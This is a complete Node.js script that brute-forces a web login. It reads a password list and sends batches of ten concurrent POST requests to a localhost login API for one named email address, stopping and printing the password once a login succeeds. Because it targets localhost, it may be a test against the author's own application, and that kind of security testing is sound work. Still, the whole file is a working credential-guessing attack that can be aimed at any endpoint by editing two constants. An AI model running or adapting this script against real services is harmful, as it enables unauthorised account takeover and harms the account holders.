import axios from 'axios';
import fs from 'fs';
import readline from 'readline';

const URL = 'http://localhost:3000/api/user/login';
const TARGET_EMAIL = 'andrei@gmail.com'; 
const PASSWORDSLIST = 'passwords-list.txt';

async function startBruteForce() {
    const passwords = fs.readFileSync(PASSWORDSLIST, 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p.length > 0);

    console.log(`--- START BRUTE FORCE: ${TARGET_EMAIL} | ${passwords.length} passwords ---`);

    const CONCURRENCY = 10;
    let found = false;
    let count = 0;

    for (let i = 0; i < passwords.length; i += CONCURRENCY) {
        if (found) break;

        const batch = passwords.slice(i, i + CONCURRENCY);

        await Promise.all(batch.map(async (password) => {
            if (found) return;
            try {
                const response = await axios.post(URL, {
                    email: TARGET_EMAIL,
                    password
                }, { timeout: 3000 });

                if (response.data.success) {
                    found = true;
                    console.log(`\n[!!!] FOUND: ${password} (after ${++count} tries)`);
                    process.exit(0);
                }
            } catch (error) {
                count++;
                if (error.response?.status === 401) {
                    if (count % 50 === 0) console.log(`[Progress] ${count} tried...`);
                } else if (error.response?.status === 404) {
                    console.log("[ERROR] User not found.");
                    process.exit(1);
                }
            }
        }));
    }

    console.log('\n[FINAL] PASSWORD NOT FOUND.');
}

startBruteForce();